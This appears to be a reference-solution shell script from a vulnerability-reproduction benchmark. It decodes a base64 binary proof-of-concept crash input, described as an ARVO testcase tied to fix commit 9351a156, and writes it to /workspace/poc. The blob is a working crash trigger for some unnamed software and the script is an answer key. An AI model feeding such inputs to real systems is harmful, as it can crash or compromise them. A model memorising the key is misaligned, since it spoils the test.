#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 9351a156 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
C3cCOnRm/5efn5+fJgCfn5+fn5+fn5+fn2ifn5+fn5+fn59SUlJSAQAAAChSUlJSUlJSUlJSUlJSUkRSUlJSUlJSUlJSUlJSUlJSUlJSUihSqFJSUlJSUlJSElJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlL//x2QUlJSUlJSUgt3/wAAAP///////////////////////////////////////////////////////////////2j//////////////////////////wt3KXJpbnRfZmlu/yj//////3//////////////////////////////////////////////////////////3/////////////////////////////////////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAADr/ygKgAD//////////////////////v//////AApSn5+fn5+fn/////////////////////////////////////////////////////8LdwI6cmExZDI5NQt3OWM4YTUzM2YxODVhYjE0YmQ3AQAAAP9hRkZGRkZGRlZGRkZGRkYAAAAAAACjo6Ojo6OjowrvKAqAZjcwOTZmMWY4MWViOTMwZDg2Mjc0OWEwNTViOTRlYzdhOGQ2Y2I2o6Ojo6Ojo6MAKQAAAAAAAAAAAAAAAABudF9ml/82EQAAAABg////YGBgYGBgYGCfn5+fn2FgYF2fn5/CAGAKYGA0YBgAAAAAAAAA6f4Ld2NiYjhjNmQzMWFmNp+fn5+fYWBgXZ+fn8IAYApgYDRgGAAAAAAAAADp/gt3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPsAAAAAAAAAAAAAAAAAAABudF9ml/82EQAAAABg////YGBgYGBgYGCfn5+fn2FgYF2fn5/CAGAKYGA0YBgAAAAAAAAA6f4LdwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+wAAAAAAAAAAAAAAAAAAAG50X2aX/zYRAAAAAGD///9gYGBgYGBgYJ+fn5+fYWBgXZ+fn8IAYApgYDRgGAAAAAAAAADp/gt3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPsAAAAAAAAAAAAAAAAAAABudF9ml/82EQAAAABg////YGBgYGBgYGCfn5+fn2FgYF2fn5/CAGAKYGA0YBgAAAAAAAAA6f4LdwAAAAAAAAAAAAAAAAAAAAAAAAAAYP///2BgYGBgYGBgn5+fn59gYF2fn5/CAGAKYGA0YBgAAAAAAAAA6f4Ldw==
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
